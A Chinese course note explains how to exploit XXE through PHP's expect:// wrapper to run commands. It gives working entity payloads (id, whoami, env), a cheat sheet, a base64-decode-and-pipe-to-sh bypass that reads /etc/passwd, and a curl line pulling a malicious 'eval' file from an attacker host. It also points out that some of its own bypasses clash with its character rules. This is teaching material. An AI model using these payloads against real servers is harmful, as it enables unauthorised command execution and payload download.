---
title: XXE 之 expect 扩展命令执行
category: XXE/利用
tags: [XXE, expect, 伪协议, 命令执行, RCE, base64绕过]
source: 课程笔记 2025-10-19
date: 2025-10-19
order: 7
---

## 一句话概括

`expect://` 是一个「把**交互式命令的输出当作一个流**来读」的伪协议。在 XXE 里，它让解析器「读资源」这个动作变成「**执行命令**」—— 于是 `<!ENTITY xxe SYSTEM "expect://id">` 就能把 `id` 的输出读进实体。**使用时机：`file://` 和 `php://` 都失败时再试它。**

## 本题情景与解题手法

### 题目形态

一个标准的 XXE 题：请求体可控、解析器会展开外部实体，但：

- `file://` 被过滤 / 读不到想要的东西
- `php://filter` 也用不上（PHP 里 `php://` 不能执行命令）

此时还有一条路：**换协议** —— 既然 `SYSTEM` 后面的 URI 由我们指定，那就换成 `expect://`。

### 第一步：确认环境里有没有 expect

`expect://` 不是 PHP 内置的，它是 **PECL 的 expect 扩展** 提供的流包装器。环境里没装这个扩展，payload 会直接解析失败。

### 第二步：发一条「最安全」的命令试探

```xml
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "expect://id">]>
```

如果响应里出现：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

说明 `expect://` 可用了，命令确实被执行了。

### 第三步：换成需要的命令

```xml
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "expect://pwd">]>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "expect://whoami">]>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "expect://env">]>
```

**注意：只能用「没有参数」的单命令**（原因见下方「七个被拒绝的字符」）。

### 第四步：需要带参数时想办法绕

带参数的命令（如 `cat /etc/passwd`）会因为**空格**被解析器拒绝，所以要么找单命令替代，要么用编码/落地文件的手法（见下）。

### 解题手法一句话总结

> `file://` / `php://` 走不通 → 换 `expect://` → 先用 `id` / `whoami` 验证扩展是否存在 → 只发**无参数命令** → 要带参数就靠 base64/十六进制编码或先落地一个脚本再执行。

## 原理

### 1. 为什么是 expect，而不是 system

这是本知识点最先要讲通的地方 —— **在 XXE 里你根本没有任何地方可以调用 PHP 函数**。

回顾一下 XXE 的机制：我们控制的只有**一份 XML 文档**，服务端做的唯一一件事是「把这份文档交给 XML 解析器解析」。整条链路上：

| 我们想要的能力 | 实际能触碰到的位置 |
|---|---|
| 调用 `system('id')` | 需要一个能执行 PHP 代码的注入点 —— XXE 不是 |
| 让服务器执行命令 | **只能通过「让解析器去读一个 URI」间接达成** |

所以命令执行的唯一突破口是：**找到一个「读它 = 执行命令」的 URI 方案**。

`expect://` 恰好就是这种东西。它的设计用途是「与交互式程序通信」，你给它一个命令，它就把这个命令当子进程跑起来，把它的**标准输出变成一个可读的流**。于是：

```text
解析器要读 expect://id  →  启动子进程执行 id  →  把 stdout 作为「文件内容」返回  →  填进实体
```

`system()` 是 PHP 的函数，解析器碰不到；`expect://` 是**流包装器（stream wrapper）**，正好挂在解析器「读资源」的那一步上。这就是「为什么用 expect 而不是 system」。

> 一句话：**XXE 只能让解析器「读」，所以要 RCE 就必须找一个「读即执行」的协议。**

### 2. 输出的含义：`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

逐段拆解：

**① `uid=33(www-data)`**

- `uid`：User ID（用户 ID）
- `33`：用户 ID 号码
- `www-data`：用户名
- **含义**：当前进程以 `www-data` 用户身份运行，系统内部 ID 是 `33`

**② `gid=33(www-data)`**

- `gid`：Group ID（主要组 ID）
- `33`：组 ID 号码
- `www-data`：组名
- **含义**：当前用户的主要组是 `www-data`，组 ID 是 `33`

**③ `groups=33(www-data)`**

- `groups`：用户所属的所有组
- `33(www-data)`：只属于一个组
- **含义**：当前用户只属于 `www-data` 这一个组

### 3. expect 不会提权 —— 但它依然极其危险

这两句话要一起理解：

**expect 协议不会扩展用户权限，但会：**

1. **暴露已有的权限** —— 让 Web 应用能动用所有它已有的系统权限
2. **扩大攻击面** —— 从有限的 Web 操作变成完整的系统命令执行
3. **继承 Web 服务权限** —— 你获得的权限等级完全取决于 Web 服务器进程的运行身份

也就是说：**你能拿到什么权限，取决于 Web 进程本身是谁。** 上面输出里的 `www-data` 就是答案 —— 不是 root，但这已经是「从只能读文件」到「能执行任意命令」的质变。

这正是为什么即使不提升权限，`expect://` 在 XXE 中仍然极其危险 —— 它把「只能按菜谱做菜的厨师」变成了「能使用厨房里所有工具和食材的厨师」。

### 4. 七个被拒绝的字符

**以下七个字符会被拒绝，PHP 的 XML 解析器会出错：**

| 被拒字符 | 说明 |
|---|---|
| 空格 | ` ` |
| 双引号 | `"` |
| 管道符 | `\|` |
| 大括号 | `{ }` |
| 反斜杠 | `\` |
| 尖括号 | `< >` |
| 冒号 | `:` |

原因在于这些字符在 XML 的**属性值 / 实体声明**上下文里有特殊语法含义（比如 `"` 和 `<` 会直接破坏文档结构），解析器在解析 `SYSTEM "expect://..."` 这一段时就会报错，命令自然跑不起来。

**因此能用的，只有「不含这七个字符」的简单命令：**

```xml
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "expect://id">]>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "expect://pwd">]>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "expect://whoami">]>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "expect://env">]>
```

### 5. 编码与混淆：带参数命令的绕过思路

这是主要的绕过思路 —— 尝试将命令编码，以避免使用被禁字符。

**Base64 编码：**

假设目标系统有 `base64` 命令且 `-d` 参数不被视为非法。

第一步，攻击者先计算命令的 Base64 编码：

```bash
echo -n "cat /etc/passwd" | base64
# 输出: Y2F0IC9ldGMvcGFzc3dk
```

第二步，在 payload 中使用解码执行：

```xml
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "expect://echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh">]>
```

命令部分：

```bash
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
```

解码过程：

- `echo Y2F0IC9ldGMvcGFzc3dk` —— 输出 Base64 编码字符串
- `| base64 -d` —— 通过管道传递给 base64 命令进行解码
- `| sh` —— 将解码后的内容传递给 shell 执行

分步拆解：

- **`echo Y2F0IC9ldGMvcGFzc3dk`**
  - 首先执行，输出字符串：`Y2F0IC9ldGMvcGFzc3dk`
  - 这个输出通过管道传递给下一个命令
- **`base64 -d`**
  - 接收上一步的字符串 `Y2F0IC9ldGMvcGFzc3dk`
  - 进行 Base64 解码，得到：`cat /etc/passwd`
  - 将这个解码后的结果通过管道传递给下一个命令
- **`sh`**
  - 接收上一步解码后的字符串：`cat /etc/passwd`
  - 将这个字符串**作为 Shell 命令来执行**
  - 最终执行的效果就是运行了 `cat /etc/passwd` 命令

> **风险点**（原笔记明确指出）：这个 payload 本身包含了 `|`（管道符）、**空格** 和 `-`（连字符，如果连字符也被禁则无效）。也就是说，这个「绕过」写法在严格环境下同样会被那七个字符的规则挡掉 —— 它更适合作为思路记录，能否用要看目标环境的解析器实现。

**十六进制编码：**

类似地，可以使用 `xxd` 或 `hexdump` 等工具进行十六进制编解码。

### 6. 另一条路：用 expect 下载文件落地

不直接执行命令，而是用 `expect://` 让服务器去**下载一个文件**，属于「先用简单命令搭桥、再扩张」的思路：

```xml
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "expect://curl -O http://攻击者IP/eval">]>
```

- `expect://curl -O http://攻击者IP/eval` —— 这就是使用 expect 协议要执行的系统命令

命令拆解：`curl -O http://攻击者IP/eval`

- **`curl`**：一个命令行工具，用于传输数据（这里用来下载文件）
- **`-O`**：（大写字母 O）curl 的参数，意思是「将服务器返回的数据，以远程文件的名称保存到本地」。这里远程文件是 `eval`，所以下载后本地文件名也是 `eval`
- **`http://攻击者IP/eval`**：要下载的文件地址
  - `攻击者IP` 是攻击者控制的服务器地址（通常是内网地址）
  - `eval` 是攻击者预先放在那台服务器上的恶意文件（可能是一个木马、后门或脚本）

**所以，这个命令的作用就是：从攻击者服务器下载 `eval` 文件，并保存到当前目录。**

> 此处原为「expect RCE」的截图，内容已还原为上面的命令与说明。

## 利用条件

1. **服务器装了 PHP expect 扩展并启用** —— `expect://` 由 PECL expect 提供，非内置；没有这个扩展协议直接不可用
2. **解析器允许外部实体** —— 同 XXE 通用条件
3. **命令不含那七个被拒字符** —— 否则 XML 解析阶段就失败
4. **Web 进程有对应权限** —— 能执行什么命令，取决于 `www-data` 这个身份的权限
5. **有回显或可外带** —— 命令输出得能运出来

## Payload 速查

| 目的 | Payload |
|---|---|
| 环境自检（推荐首选试探） | `<!ENTITY xxe SYSTEM "expect://id">` |
| 当前用户 | `<!ENTITY xxe SYSTEM "expect://whoami">` |
| 当前目录 | `<!ENTITY xxe SYSTEM "expect://pwd">` |
| 环境变量 | `<!ENTITY xxe SYSTEM "expect://env">` |
| 列目录（见备注） | `<!ENTITY xxe SYSTEM "expect://ls">` |
| 带参数命令（base64 绕过） | `expect://echo <base64> \| base64 -d \| sh` |
| 下载落地 | `expect://curl -O http://攻击者IP/eval` |

## 完整示例

### 最小可用请求体

```xml
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "expect://id">]>
<root><admin>&xxe;</admin></root>
```

（节点名按目标源码里实际被 `echo` 出来的那个节点写。）

响应：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 带参数命令的编码绕过

```bash
# 攻击机本地先把命令编码
echo -n "cat /etc/passwd" | base64
# Y2F0IC9ldGMvcGFzc3dk
```

```xml
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "expect://echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh">]>
<root><admin>&xxe;</admin></root>
```

## 踩坑与备注

- **原笔记的排版歧义（无法还原）**：原文在「所以」和「可使用」之间放了一个 `expect://ls` 的 payload，句子看起来缺了「不」字 —— 按上下文推断，应为**「`expect://ls` 不可使用，可使用 `id` / `pwd` / `whoami` / `env`」**。本文保留两种解读，并以「四个已验证可用的 payload」为准。`ls` 本身不含那七个被拒字符，理论上不该被解析器拒绝，若在你的环境里能用属正常。
- **优先用 `id` 探路**：`id` 既验证了 `expect://` 可用，又顺便告诉你当前权限身份，信息量最大。
- **`curl -O` 那个 payload 含空格和冒号**，按本文的「七字符」规则理应解析失败；原笔记把它归在「或者使用 RCE 方法」下作为思路记录，实测能否成功取决于目标环境的解析器实现。
- **思路记录（原笔记）**：`file://` 与 `php://` 都失败时再尝试 `expect://` —— 它是备选方案而不是第一选择，因为扩展是否安装完全看目标环境。
- **本文把原笔记里的 `10.1.1.1` 统一抽象为 `攻击者IP`**，实战时替换成自己那台机器。
